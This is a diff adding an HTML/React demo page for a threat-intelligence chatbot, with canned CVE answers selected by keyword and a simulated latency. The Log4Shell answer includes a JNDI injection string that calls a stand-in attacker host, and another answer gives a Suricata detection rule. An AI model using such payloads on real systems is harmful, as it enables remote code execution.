@@ -1,0 +1,1331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>SecureLLM v2 — Threat Intelligence</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<script src="https://unpkg.com/react@18.3.1/umd/react.development.js" integrity="sha384-hD6/rw4ppMLGNu3tX5cjIb+uRZ7UkRJ6BPkLpg4hAu/6onKUg4lLsHAs9EBPT82L" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/react-dom@18.3.1/umd/react-dom.development.js" integrity="sha384-u6aeetuaXnQ38mYT8rp6sbXaQe3NL9t+IBXmnYxwkUI2Hw4bsp2Wvmx4yRQF1uAm" crossorigin="anonymous"></script>
+<script src="https://unpkg.com/@babel/standalone@7.29.0/babel.min.js" integrity="sha384-m08KidiNqLdpJqLq95G/LEi8Qvjl/xUYll3QILypMoQ65QorJ9Lvtp2RXYGBFj1y" crossorigin="anonymous"></script>
+<style>
+:root{--bg:#0D0906;--bg2:#140E09;--red:#CC3010;--red2:#FF4422;--rg:rgba(204,48,16,.35);--brd:rgba(204,48,16,.28);--brd2:rgba(255,68,34,.55);--text:#EDD8C4;--muted:#7A4432;--dim:#3C1A08;--green:#1DB845;--teal:#00BBAA;--mono:'JetBrains Mono',monospace}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body,#root{height:100%;overflow:hidden}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);min-width:960px}
+/* CRT scanlines */
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,.09) 3px,rgba(0,0,0,.09) 4px);pointer-events:none;z-index:9999}
+/* Scrollbars */
+::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(204,48,16,.3)}
+.sb-scroll::-webkit-scrollbar{width:2px}
+/* Range slider */
+.slider{-webkit-appearance:none;height:2px;background:rgba(204,48,16,.2);outline:none;cursor:pointer}
+.slider::-webkit-slider-thumb{-webkit-appearance:none;width:10px;height:10px;border-radius:0;background:#FF4422;cursor:pointer;box-shadow:0 0 6px rgba(204,48,16,.5)}
+select option{background:#140E09;color:#EDD8C4}
+textarea::placeholder{color:var(--dim)}
+textarea{caret-color:var(--red2)}
+
+/* ═══ Animations ═══ */
+@keyframes glitch{0%,84%,100%{text-shadow:none;transform:skewX(0)}85%{text-shadow:-2px 0 var(--teal),2px 1px var(--red2);transform:skewX(-1.5deg) translateX(-1px)}87%{text-shadow:2px 0 var(--red);transform:skewX(1deg)}89%{text-shadow:none;transform:skewX(0)}}
+.glitch{animation:glitch 9s linear infinite}
+@keyframes msgIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.msg-in{animation:msgIn .22s ease forwards}
+@keyframes scanLine{0%{top:0;opacity:.95}100%{top:100%;opacity:0}}
+.scan-line{position:absolute;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--red2) 20%,var(--red2) 80%,transparent);animation:scanLine .72s ease forwards;pointer-events:none;z-index:10}
+@keyframes bounce{0%,80%,100%{transform:translateY(0);opacity:.3}40%{transform:translateY(-5px);opacity:1}}
+.dot{animation:bounce 1.4s ease-in-out infinite}.dot:nth-child(2){animation-delay:.2s}.dot:nth-child(3){animation-delay:.4s}
+@keyframes critGlow{0%,100%{box-shadow:0 0 4px rgba(255,68,34,.4)}50%{box-shadow:0 0 12px rgba(255,68,34,.9),0 0 22px rgba(255,68,34,.25)}}
+.sev-crit{animation:critGlow 1.8s ease-in-out infinite!important}
+@keyframes radarPing{0%{transform:scale(1);opacity:.7}100%{transform:scale(4.5);opacity:0}}
+.radar-ping{position:absolute;inset:0;border-radius:50%;border:1px solid var(--green);animation:radarPing 2.4s ease-out infinite}
+.radar-ping2{position:absolute;inset:0;border-radius:50%;border:1px solid var(--green);animation:radarPing 2.4s ease-out infinite 1.2s}
+@keyframes triPulse{0%,100%{opacity:.9}50%{opacity:.4;transform:scale(.95)}}
+.tri-pulse{animation:triPulse 2.2s ease-in-out infinite}
+@keyframes cveTrace{0%{top:-6%;opacity:0}10%,90%{opacity:1}100%{top:106%;opacity:0}}
+.cve-trace{position:absolute;left:-1px;width:2px;height:28px;background:linear-gradient(180deg,transparent,var(--red2),transparent);animation:cveTrace var(--d,3.2s) ease-in-out infinite;animation-delay:var(--dl,0s);border-radius:2px;pointer-events:none;z-index:5}
+@keyframes hexFloat{0%,100%{transform:translateY(0) rotate(0deg);opacity:.1}50%{transform:translateY(-20px) rotate(180deg);opacity:.04}}
+.hex-p{position:absolute;animation:hexFloat var(--d,5s) ease-in-out infinite;animation-delay:var(--dl,0s);pointer-events:none}
+@keyframes gradSpin{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.inp-wrap{padding:1px;background:rgba(204,48,16,.24);transition:background .3s}
+.inp-wrap.on{background:linear-gradient(90deg,#CC3010,#FF4422,#7B2FFF,#FF4422,#CC3010);background-size:300% 300%;animation:gradSpin 4s linear infinite}
+.chat-bg{background-image:linear-gradient(rgba(204,48,16,.012) 1px,transparent 1px),linear-gradient(90deg,rgba(204,48,16,.012) 1px,transparent 1px);background-size:44px 44px}
+@keyframes cursorBlink{0%,100%{opacity:1}50%{opacity:0}}.stream-cursor{animation:cursorBlink 1s step-end infinite;color:#FF4422}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<script type="text/babel">
+const { useState, useEffect, useRef, useMemo, useCallback } = React;
+
+/* ═══════════════════════════════════════════════
+   COLOUR TOKENS
+═══════════════════════════════════════════════ */
+const C = {
+  bg:'#0D0906', bg2:'#140E09', bg3:'#1C1209',
+  red:'#CC3010', red2:'#FF4422',
+  rg:'rgba(204,48,16,.35)',
+  brd:'rgba(204,48,16,.28)', brd2:'rgba(255,68,34,.55)',
+  text:'#EDD8C4', muted:'#7A4432', dim:'#3C1A08',
+  teal:'#00BBAA', green:'#1DB845',
+};
+
+/* ═══════════════════════════════════════════════
+   CVE DATABASE
+═══════════════════════════════════════════════ */
+const CVE_DATABASE = {
+  'CVE-2021-44228': {
+    id:'CVE-2021-44228', title:'Apache Log4j2 RCE (Log4Shell)',
+    severity:'CRITICAL', cvss:10.0, published:'2021-12-10',
+    vector:'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
+    description:'JNDI lookup injection in Log4j2 enables unauthenticated RCE on any application logging user-controlled input.',
+    affected:'Apache Log4j2 2.0-beta9 through 2.15.0 (excl. 2.12.2)',
+    patch:'Upgrade to Log4j2 2.17.1+ (Java 8) / 2.12.4+ (Java 7)',
+    references:[
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'},
+      {label:'Apache Security Advisory',url:'#'},
+      {label:'CISA Alert AA21-356A',url:'#'},
+    ],
+  },
+  'CVE-2024-3400': {
+    id:'CVE-2024-3400', title:'PAN-OS GlobalProtect OS Command Injection',
+    severity:'CRITICAL', cvss:10.0, published:'2024-04-12',
+    vector:'AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
+    description:'OS command injection via GlobalProtect gateway allows unauthenticated root-level RCE. Device telemetry is NOT required — Palo Alto retracted that prerequisite in an updated advisory.',
+    affected:'PAN-OS 10.2, 11.0, 11.1 with GlobalProtect gateway or portal enabled',
+    patch:'PAN-OS 10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3; apply Threat IDs 95187, 95189, 95191',
+    references:[
+      {label:'Palo Alto Networks Advisory',url:'#'},
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2024-3400'},
+    ],
+  },
+  'CVE-2023-44487': {
+    id:'CVE-2023-44487', title:'HTTP/2 Rapid Reset Attack',
+    severity:'HIGH', cvss:7.5, published:'2023-10-10',
+    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H',
+    description:'HTTP/2 RST_STREAM cancellation loops enable high-volume DDoS attacks exceeding 398M RPS.',
+    affected:'nginx, Apache httpd, IIS, Go net/http, nghttp2, and others',
+    patch:'Apply vendor-specific patches; enforce stream limits',
+    references:[
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-44487'},
+      {label:'Cloudflare Technical Analysis',url:'#'},
+    ],
+  },
+  'CVE-2022-0847': {
+    id:'CVE-2022-0847', title:'Linux Kernel "Dirty Pipe" LPE',
+    severity:'HIGH', cvss:7.8, published:'2022-03-07',
+    vector:'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
+    description:'Uninitialized pipe buffer flags allow local users to overwrite arbitrary read-only files and escalate to root.',
+    affected:'Linux kernel 5.8 through 5.16.10 / 5.15.24 / 5.10.101',
+    patch:'Linux 5.16.11, 5.15.25, 5.10.102',
+    references:[
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2022-0847'},
+      {label:'dirtypipe.cm4all.com',url:'https://dirtypipe.cm4all.com'},
+    ],
+  },
+  'CVE-2021-26855': {
+    id:'CVE-2021-26855', title:'Microsoft Exchange ProxyLogon SSRF',
+    severity:'CRITICAL', cvss:9.8, published:'2021-03-02',
+    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
+    description:'Pre-auth SSRF enables bypass of Exchange authentication, forming the first link in the ProxyLogon RCE chain.',
+    affected:'Exchange Server 2013 CU23, 2016 CU18/19, 2019 CU7/8',
+    patch:'March 2021 Security Update (KB5000871)',
+    references:[
+      {label:'Microsoft Security Advisory',url:'#'},
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2021-26855'},
+    ],
+  },
+  'CVE-2023-23397': {
+    id:'CVE-2023-23397', title:'Microsoft Outlook Zero-Click NTLM Relay',
+    severity:'CRITICAL', cvss:9.8, published:'2023-03-14',
+    vector:'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
+    description:'Zero-click credential theft via malicious calendar invite; Outlook triggers NTLM auth on receipt without user interaction.',
+    affected:'Microsoft Outlook 2013 SP1 through 2021 (Windows)',
+    patch:'Patch Tuesday March 2023',
+    references:[
+      {label:'Microsoft Security Advisory',url:'#'},
+      {label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-23397'},
+    ],
+  },
+  'CVE-2023-0386': {
+    id:'CVE-2023-0386', title:'Linux OverlayFS Privilege Escalation',
+    severity:'HIGH', cvss:7.8, published:'2023-04-05',
+    vector:'AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
+    description:'Improper permission check in OverlayFS allows mapping SUID files from lower layer, enabling local privilege escalation.',
+    affected:'Linux kernel 5.11 through 6.2 with user namespaces enabled',
+    patch:'Linux 6.2.4+',
+    references:[{label:'NVD Detail',url:'https://nvd.nist.gov/vuln/detail/CVE-2023-0386'}],
+  },
+};
+
+const SEVERITY_CONFIG = {
+  CRITICAL:{color:'#FF4422',bg:'rgba(255,68,34,.12)',  border:'rgba(255,68,34,.45)' },
+  HIGH:    {color:'#FF8C00',bg:'rgba(255,140,0,.12)',   border:'rgba(255,140,0,.4)'  },
+  MEDIUM:  {color:'#FFD700',bg:'rgba(255,215,0,.1)',    border:'rgba(255,215,0,.4)'  },
+  LOW:     {color:'#4A90D9',bg:'rgba(74,144,217,.12)',  border:'rgba(74,144,217,.4)' },
+};
+
+/* ═══════════════════════════════════════════════
+   DEMO RESPONSES
+═══════════════════════════════════════════════ */
+const DEMO_RESPONSES = {
+  log4shell:`## Log4Shell — CVE-2021-44228
+
+**Severity**: [CRITICAL] — CVSS **10.0** (AV:N/AC:L/PR:N/UI:N)
+
+Log4Shell is a critical RCE vulnerability in Apache Log4j2's JNDI lookup feature. Disclosed December 9, 2021, it became the fastest-exploited vulnerability in history, affecting virtually every Java-based enterprise stack.
+
+### Attack Mechanism
+
+Log4j2 evaluates JNDI expressions embedded in log messages. An attacker sends \`\${jndi:ldap://attacker.com/x}\` as any user-controlled input — HTTP headers, usernames, form fields — triggering an outbound LDAP request that executes attacker-controlled Java bytecode.
+
+### Scope of Impact
+
+- **Affected**: Apache Log4j2 2.0-beta9 through 2.15.0
+- **Products hit**: VMware vCenter, Cisco, Apple iCloud, Amazon AWS, Microsoft Azure AD, Elasticsearch, Twitter
+- CISA added CVE-2021-44228 to KEV catalog December 10, 2021
+
+### Remediation
+
+- Upgrade to Log4j2 **2.17.1+** (Java 8), **2.12.4+** (Java 7), or **2.3.2+** (Java 6)
+- Temporary: set \`-Dlog4j2.formatMsgNoLookups=true\` JVM flag
+- Network: block outbound LDAP (TCP 389) and RMI (TCP 1099)`,
+
+  pan_os:`## CVE-2024-3400 — PAN-OS GlobalProtect
+
+**Severity**: [CRITICAL] — CVSS **10.0**
+
+Command injection in PAN-OS allows unauthenticated root-level RCE via the GlobalProtect gateway. **Device telemetry is NOT required** — Palo Alto retracted that prerequisite in an updated advisory.
+
+### Prerequisite
+
+- GlobalProtect **gateway or portal** is active and configured (any affected version)
+
+### Attack Summary
+
+- **Vector**: Network-accessible, no credentials, no user interaction
+- **Impact**: Full device compromise — read configs, deploy implants, lateral movement
+- **Exploitation**: Observed by threat actor **UTA0218** since March 2024
+
+### Affected Versions
+
+- PAN-OS 10.2.x → patched in **10.2.9-h1**
+- PAN-OS 11.0.x → patched in **11.0.4-h1**
+- PAN-OS 11.1.x → patched in **11.1.2-h3**
+- PAN-OS 10.1 and earlier are not affected
+
+### Remediation (Updated)
+
+- Apply hotfix patches immediately — the only reliable fix
+- Enable Threat Prevention with Threat IDs **95187, 95189, 95191** on the GlobalProtect interface
+- **Do not rely on disabling device telemetry** — confirmed insufficient by Palo Alto`,
+
+  pan_os_uta0218:`## UTA0218 — CVE-2024-3400 Exploitation Campaign
+
+**Threat Actor**: UTA0218 (suspected nation-state; attributed by Volexity)
+**Vulnerability**: CVE-2024-3400 [CRITICAL] CVSS **10.0**
+**Active since**: March 26, 2024 — weeks before public disclosure (April 12, 2024)
+
+### Initial Access
+
+UTA0218 exploited CVE-2024-3400 by crafting HTTP requests to the GlobalProtect portal. They injected OS commands via a shell metacharacter injection in the session file name parser — no credentials or user interaction required.
+
+### Execution Chain
+
+- Malicious session files created in \`/var/tmp/\` with embedded bash commands
+- Triggered via specially crafted \`SESSID\` cookie values sent to the portal
+- Commands executed as **root** on the host firewall OS
+
+### UPSTYLE Backdoor
+
+The actor deployed a custom Python backdoor named **UPSTYLE**:
+- Installed to \`/usr/lib/python3.6/site-packages/system.pth\`
+- Monitors the nginx error log for encoded commands embedded in CSS-style requests
+- Commands triggered via \`img[src^=\` patterns in crafted web requests
+- Results written to \`bootstrap.min.css\` for silent exfiltration via HTTP
+- Restores original file after each execution to evade detection
+
+### Post-Exploitation (Observed)
+
+- Credential harvesting via \`ntdsutil\` Active Directory dumps
+- Exfiltration of VPN configs, device certificates, session tokens
+- Internal lateral movement using stolen credentials
+- Persistent reverse shells via cron jobs
+
+### Indicators of Compromise
+
+- Files: \`/tmp/lmlog\`, \`/usr/lib/python3.6/site-packages/system.pth\`
+- Unusual \`SESSID\` cookie formats in GlobalProtect access logs
+- Unexpected outbound connections from firewall management IP
+
+### Remediation
+
+Apply patches: PAN-OS **10.2.9-h1 / 11.0.4-h1 / 11.1.2-h3**
+Enable Threat IDs **95187, 95189, 95191** on the GlobalProtect interface`,
+
+  pan_os_firewall:`## Firewall Rules to Mitigate CVE-2024-3400
+
+**Critical note**: Network controls are secondary. **Apply PAN-OS patches immediately.**
+
+### Primary Mitigation — Palo Alto Threat Prevention
+
+Enable Threat Prevention and block these Threat IDs on the GlobalProtect interface:
+- **95187** — CVE-2024-3400 command injection (variant 1)
+- **95189** — CVE-2024-3400 command injection (variant 2)
+- **95191** — CVE-2024-3400 command injection (variant 3)
+
+Apply threat prevention profiles to the security policy covering inbound GlobalProtect traffic.
+
+### Network-Level Controls
+
+- Restrict GlobalProtect portal/gateway (TCP 443) to known source IP ranges
+- Block inbound access to the management interface from untrusted networks
+- Rate-limit or inspect requests with abnormal \`SESSID\` cookie patterns
+- Alert on unexpected outbound connections from the firewall's own IP
+
+### Detection (Suricata/Snort)
+
+\`\`\`
+alert http any any -> $PAN_IP 443 (
+  msg:"CVE-2024-3400 exploit attempt";
+  content:"SESSID=";
+  pcre:"/SESSID=[^;]*[;&|\`\$()]/";
+  sid:2024340001; rev:1;
+)
+\`\`\`
+
+### What NOT to Rely On
+
+- **Disabling device telemetry** — Palo Alto confirmed this is insufficient
+- IP allowlisting alone — UTA0218 used infrastructure that blended with legitimate traffic`,
+
+  severity:`## CRITICAL vs HIGH — Severity Classification
+
+### CVSS v3.1 Score Thresholds
+
+- [CRITICAL] CVSS **9.0–10.0** → Emergency patch within 24–72 hours
+- [HIGH] CVSS **7.0–8.9** → Priority patch within 7 days
+- [MEDIUM] CVSS **4.0–6.9** → Standard cycle within 30 days
+- [LOW] CVSS **0.1–3.9** → Next scheduled maintenance
+
+### What Makes a Vulnerability CRITICAL?
+
+CRITICAL scores combine **all** of the following factors:
+- **Network accessible** (\`AV:N\`) — remotely exploitable without local access
+- **No privileges required** (\`PR:N\`) — zero credentials needed
+- **No user interaction** (\`UI:N\`) — no victim action required
+- **Complete CIA loss** (\`C:H/I:H/A:H\`) — full confidentiality, integrity, availability impact
+
+### HIGH vs CRITICAL in Practice
+
+HIGH vulnerabilities have at least one mitigating factor:
+- Local access only (\`AV:L\`) — e.g., CVE-2022-0847 [HIGH] 7.8 (Dirty Pipe, local LPE only)
+- Low-privilege account needed (\`PR:L\`)
+- Availability-only impact — e.g., CVE-2023-44487 [HIGH] 7.5 (HTTP/2 DDoS, no data leak)`,
+
+  apache:`## Recent Apache Vulnerabilities
+
+### Apache Log4j2
+- CVE-2021-44228 [CRITICAL] 10.0 — JNDI RCE "Log4Shell" (2021-12-10)
+- CVE-2021-45046 [CRITICAL] 9.0 — Log4Shell bypass in v2.15.0 (2021-12-14)
+- CVE-2021-45105 [HIGH] 7.5 — Infinite recursion DoS (2021-12-18)
+
+### Apache HTTP Server
+- CVE-2023-25690 [CRITICAL] 9.8 — \`mod_proxy\` HTTP request smuggling
+- CVE-2023-44487 [HIGH] 7.5 — HTTP/2 Rapid Reset DDoS
+- CVE-2021-41773 [CRITICAL] 9.8 — Path traversal + RCE in httpd 2.4.49
+
+### Apache Commons Text
+- CVE-2022-42889 [CRITICAL] 9.8 — "Text4Shell" variable interpolation RCE
+
+### Monitoring Recommendations
+
+- Subscribe to **security@apache.org** mailing list
+- Filter NVD CPE feed: \`cpe:2.3:a:apache:*\`
+- Review CISA KEV catalog for actively exploited Apache CVEs`,
+
+  generic:`I'm **SecureLLM**, a threat intelligence assistant fine-tuned on **9,992 CVE records** from the NVD corpus with additional context from security advisories, exploit databases, and vendor bulletins.
+
+### Capabilities
+
+- **CVE Analysis** — technical breakdown of any vulnerability ID
+- **Severity Assessment** — CVSS scoring methodology and real-world impact
+- **Remediation Guidance** — patch recommendations, mitigations, workarounds
+- **Threat Landscape** — vulnerability class trends and active exploitation data
+
+Try asking about **CVE-2021-44228**, "latest Apache vulnerabilities", or "compare CRITICAL vs HIGH severity".`,
+};
+
+function getDemoResponse(msg) {
+  const m=msg.toLowerCase(), lat=16000+Math.random()*18000;
+  const panRelated=m.includes('cve-2024-3400')||m.includes('pan-os')||m.includes('globalprotect')||m.includes('palo alto');
+  if(m.includes('log4shell')||m.includes('cve-2021-44228'))return{response:DEMO_RESPONSES.log4shell,latency_ms:lat};
+  // Query-specific pan-os variants first
+  if(panRelated&&(m.includes('uta0218')||m.includes('threat actor')||m.includes('attack chain')||m.includes('how did')||m.includes('exploit')||m.includes('upstyle')||m.includes('campaign')))return{response:DEMO_RESPONSES.pan_os_uta0218,latency_ms:lat};
+  if(panRelated&&(m.includes('firewall')||m.includes('rule')||m.includes('mitigat')||m.includes('block')||m.includes('detect')||m.includes('suricata')||m.includes('snort')))return{response:DEMO_RESPONSES.pan_os_firewall,latency_ms:lat};
+  if(panRelated)return{response:DEMO_RESPONSES.pan_os,latency_ms:lat};
+  if((m.includes('critical')&&m.includes('high'))||m.includes('compare')||m.includes('cvss'))return{response:DEMO_RESPONSES.severity,latency_ms:lat};
+  if(m.includes('apache'))return{response:DEMO_RESPONSES.apache,latency_ms:lat};
+  return{response:DEMO_RESPONSES.generic,latency_ms:lat};
+}
+function extractCVEs(t){return[...new Set((t.match(/CVE-\d{4}-\d{4,7}/g)||[]))];}
+function formatRelativeTime(d){const df=Date.now()-d.getTime(),m=Math.floor(df/60000),h=Math.floor(df/3600000),dy=Math.floor(df/86400000);if(m<1)return'NOW';if(m<60)return`${m}m`;if(h<24)return`${h}h`;if(dy===1)return'1d';if(dy<7)return`${dy}d`;return d.toLocaleDateString('en-US',{month:'short',day:'numeric'});}
+function estimateTokens(t){return Math.floor(t.split(/\s+/).length*1.35);}
+
+/* ═══════════════════════════════════════════════
+   TWEAKS PANEL
+═══════════════════════════════════════════════ */
+const __TWEAKS_STYLE = `
+  .twk-panel{position:fixed;right:16px;bottom:16px;z-index:2147483646;width:280px;
+    max-height:calc(100vh - 32px);display:flex;flex-direction:column;
+    transform:scale(var(--dc-inv-zoom,1));transform-origin:bottom right;
+    background:rgba(250,249,247,.78);color:#29261b;
+    -webkit-backdrop-filter:blur(24px) saturate(160%);backdrop-filter:blur(24px) saturate(160%);
+    border:.5px solid rgba(255,255,255,.6);border-radius:14px;
+    box-shadow:0 1px 0 rgba(255,255,255,.5) inset,0 12px 40px rgba(0,0,0,.18);
+    font:11.5px/1.4 ui-sans-serif,system-ui,-apple-system,sans-serif;overflow:hidden}
+  .twk-hd{display:flex;align-items:center;justify-content:space-between;
+    padding:10px 8px 10px 14px;cursor:move;user-select:none}
+  .twk-hd b{font-size:12px;font-weight:600;letter-spacing:.01em}
+  .twk-x{appearance:none;border:0;background:transparent;color:rgba(41,38,27,.55);
+    width:22px;height:22px;border-radius:6px;cursor:default;font-size:13px;line-height:1}
+  .twk-x:hover{background:rgba(0,0,0,.06);color:#29261b}
+  .twk-body{padding:2px 14px 14px;display:flex;flex-direction:column;gap:10px;
+    overflow-y:auto;overflow-x:hidden;min-height:0;
+    scrollbar-width:thin;scrollbar-color:rgba(0,0,0,.15) transparent}
+  .twk-body::-webkit-scrollbar{width:8px}
+  .twk-body::-webkit-scrollbar-track{background:transparent;margin:2px}
+  .twk-body::-webkit-scrollbar-thumb{background:rgba(0,0,0,.15);border-radius:4px;
+    border:2px solid transparent;background-clip:content-box}
+  .twk-row{display:flex;flex-direction:column;gap:5px}
+  .twk-row-h{flex-direction:row;align-items:center;justify-content:space-between;gap:10px}
+  .twk-lbl{display:flex;justify-content:space-between;align-items:baseline;color:rgba(41,38,27,.72)}
+  .twk-lbl>span:first-child{font-weight:500}
+  .twk-val{color:rgba(41,38,27,.5);font-variant-numeric:tabular-nums}
+  .twk-sect{font-size:10px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;
+    color:rgba(41,38,27,.45);padding:10px 0 0}
+  .twk-sect:first-child{padding-top:0}
+  .twk-slider{appearance:none;-webkit-appearance:none;width:100%;height:4px;margin:6px 0;
+    border-radius:999px;background:rgba(0,0,0,.12);outline:none}
+  .twk-slider::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;
+    width:14px;height:14px;border-radius:50%;background:#fff;
+    border:.5px solid rgba(0,0,0,.12);box-shadow:0 1px 3px rgba(0,0,0,.2);cursor:default}
+  .twk-toggle{position:relative;width:32px;height:18px;border:0;border-radius:999px;
+    background:rgba(0,0,0,.15);transition:background .15s;cursor:default;padding:0}
+  .twk-toggle[data-on="1"]{background:#34c759}
+  .twk-toggle i{position:absolute;top:2px;left:2px;width:14px;height:14px;border-radius:50%;
+    background:#fff;box-shadow:0 1px 2px rgba(0,0,0,.25);transition:transform .15s}
+  .twk-toggle[data-on="1"] i{transform:translateX(14px)}
+  .twk-chips{display:flex;gap:6px}
+  .twk-chip{position:relative;appearance:none;flex:1;min-width:0;height:46px;
+    padding:0;border:0;border-radius:6px;overflow:hidden;cursor:default;
+    box-shadow:0 0 0 .5px rgba(0,0,0,.12),0 1px 2px rgba(0,0,0,.06);transition:transform .12s}
+  .twk-chip:hover{transform:translateY(-1px)}
+  .twk-chip[data-on="1"]{box-shadow:0 0 0 1.5px rgba(0,0,0,.85),0 2px 6px rgba(0,0,0,.15)}
+  .twk-chip svg{position:absolute;top:6px;left:6px;width:13px;height:13px;
+    filter:drop-shadow(0 1px 1px rgba(0,0,0,.3))}
+`;
+
+function useTweaks(defaults) {
+  const [values, setValues] = React.useState(defaults);
+  const setTweak = React.useCallback((keyOrEdits, val) => {
+    const edits = typeof keyOrEdits === 'object' && keyOrEdits !== null
+      ? keyOrEdits : { [keyOrEdits]: val };
+    setValues((prev) => ({ ...prev, ...edits }));
+    window.parent.postMessage({ type: '__edit_mode_set_keys', edits }, '*');
+    window.dispatchEvent(new CustomEvent('tweakchange', { detail: edits }));
+  }, []);
+  return [values, setTweak];
+}
+
+function TweaksPanel({ title = 'Tweaks', children }) {
+  const [open, setOpen] = React.useState(false);
+  const dragRef = React.useRef(null);
+  const offsetRef = React.useRef({ x: 16, y: 16 });
+  const PAD = 16;
+
+  const clampToViewport = React.useCallback(() => {
+    const panel = dragRef.current;
+    if (!panel) return;
+    const w = panel.offsetWidth, h = panel.offsetHeight;
+    const maxRight = Math.max(PAD, window.innerWidth - w - PAD);
+    const maxBottom = Math.max(PAD, window.innerHeight - h - PAD);
+    offsetRef.current = {
+      x: Math.min(maxRight, Math.max(PAD, offsetRef.current.x)),
+      y: Math.min(maxBottom, Math.max(PAD, offsetRef.current.y)),
+    };
+    panel.style.right = offsetRef.current.x + 'px';
+    panel.style.bottom = offsetRef.current.y + 'px';
+  }, []);
+
+  React.useEffect(() => {
+    if (!open) return;
+    clampToViewport();
+    const ro = new ResizeObserver(clampToViewport);
+    ro.observe(document.documentElement);
+    return () => ro.disconnect();
+  }, [open, clampToViewport]);
+
+  React.useEffect(() => {
+    const onMsg = (e) => {
+      const t = e?.data?.type;
+      if (t === '__activate_edit_mode') setOpen(true);
+      else if (t === '__deactivate_edit_mode') setOpen(false);
+    };
+    window.addEventListener('message', onMsg);
+    window.parent.postMessage({ type: '__edit_mode_available' }, '*');
+    return () => window.removeEventListener('message', onMsg);
+  }, []);
+
+  const dismiss = () => {
+    setOpen(false);
+    window.parent.postMessage({ type: '__edit_mode_dismissed' }, '*');
+  };
+
+  const onDragStart = (e) => {
+    const panel = dragRef.current;
+    if (!panel) return;
+    const r = panel.getBoundingClientRect();
+    const sx = e.clientX, sy = e.clientY;
+    const startRight = window.innerWidth - r.right;
+    const startBottom = window.innerHeight - r.bottom;
+    const move = (ev) => {
+      offsetRef.current = { x: startRight-(ev.clientX-sx), y: startBottom-(ev.clientY-sy) };
+      clampToViewport();
+    };
+    const up = () => { window.removeEventListener('mousemove',move); window.removeEventListener('mouseup',up); };
+    window.addEventListener('mousemove', move);
+    window.addEventListener('mouseup', up);
+  };
+
+  if (!open) return null;
+  return (
+    <>
+      <style>{__TWEAKS_STYLE}</style>
+      <div ref={dragRef} className="twk-panel" style={{ right: offsetRef.current.x, bottom: offsetRef.current.y }}>
+        <div className="twk-hd" onMouseDown={onDragStart}>
+          <b>{title}</b>
+          <button className="twk-x" onMouseDown={(e) => e.stopPropagation()} onClick={dismiss}>✕</button>
+        </div>
+        <div className="twk-body">{children}</div>
+      </div>
+    </>
+  );
+}
+
+function TweakSection({ label, children }) {
+  return <><div className="twk-sect">{label}</div>{children}</>;
+}
+
+function TweakRow({ label, value, children, inline = false }) {
+  return (
+    <div className={inline ? 'twk-row twk-row-h' : 'twk-row'}>
+      <div className="twk-lbl">
+        <span>{label}</span>
+        {value != null && <span className="twk-val">{value}</span>}
+      </div>
+      {children}
+    </div>
+  );
+}
+
+function TweakSlider({ label, value, min=0, max=100, step=1, unit='', onChange }) {
+  return (
+    <TweakRow label={label} value={`${value}${unit}`}>
+      <input type="range" className="twk-slider" min={min} max={max} step={step}
+             value={value} onChange={(e) => onChange(Number(e.target.value))} />
+    </TweakRow>
+  );
+}
+
+function TweakToggle({ label, value, onChange }) {
+  return (
+    <div className="twk-row twk-row-h">
+      <div className="twk-lbl"><span>{label}</span></div>
+      <button type="button" className="twk-toggle" data-on={value?'1':'0'}
+              onClick={() => onChange(!value)}><i /></button>
+    </div>
+  );
+}
+
+function __twkIsLight(hex) {
+  const h = String(hex).replace('#','');
+  const x = h.length===3 ? h.replace(/./g,(c)=>c+c) : h.padEnd(6,'0');
+  const n = parseInt(x.slice(0,6),16);
+  if(Number.isNaN(n))return true;
+  const r=(n>>16)&255,g=(n>>8)&255,b=n&255;
+  return r*299+g*587+b*114>148000;
+}
+
+const __TwkCheck = ({light}) => (
+  <svg viewBox="0 0 14 14" aria-hidden="true">
+    <path d="M3 7.2 5.8 10 11 4.2" fill="none" strokeWidth="2.2"
+          strokeLinecap="round" strokeLinejoin="round"
+          stroke={light?'rgba(0,0,0,.78)':'#fff'}/>
+  </svg>
+);
+
+function TweakColor({ label, value, options, onChange }) {
+  if (!options || !options.length) {
+    return (
+      <div className="twk-row twk-row-h">
+        <div className="twk-lbl"><span>{label}</span></div>
+        <input type="color" className="twk-swatch" value={value} onChange={(e)=>onChange(e.target.value)}/>
+      </div>
+    );
+  }
+  const key = (o) => String(JSON.stringify(o)).toLowerCase();
+  const cur = key(value);
+  return (
+    <TweakRow label={label}>
